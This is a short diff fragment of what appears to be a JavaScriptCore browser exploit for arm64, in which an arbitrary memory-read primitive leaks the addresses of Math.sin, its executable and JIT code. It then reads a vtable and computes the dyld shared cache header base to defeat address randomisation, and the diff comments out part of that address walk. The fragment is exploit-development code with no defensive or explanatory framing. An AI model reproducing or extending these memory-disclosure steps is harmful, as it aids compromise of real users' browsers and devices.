@@ -638,7 +638,7 @@ for (var i = 0; i < 1000; ++i) {
         print("Math.sin() @ " + sinFuncAddr);
         var executableAddr = memory.readInt64(Add(sinFuncAddr, new Int64("0x24")));
         print("Math.sin() ExecutableAddr @ " + executableAddr);
-        var jitCodeAddr = memory.readInt64(Add(executableAddr,new Int64("0x24")));
+        /*var jitCodeAddr = memory.readInt64(Add(executableAddr,new Int64("0x24")));
 	print("Math.sin() jitCodeAddr @ " + jitCodeAddr);
         
         var vtab = memory.readInt64(jitCodeAddr);
@@ -646,7 +646,7 @@ for (var i = 0; i < 1000; ++i) {
         var anchor1 = memory.readInt64(vtab)
         print("anchor1" + anchor1);
         var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
-	print('JSC header @' + jsc); //dyld_cache_header
+	print('JSC header @' + jsc);*/ //dyld_cache_header
         /*while(true)
         {
         if(strcmp(memory.read(jsc, 0x10), "dyld_v1   arm64")) //cache header magic
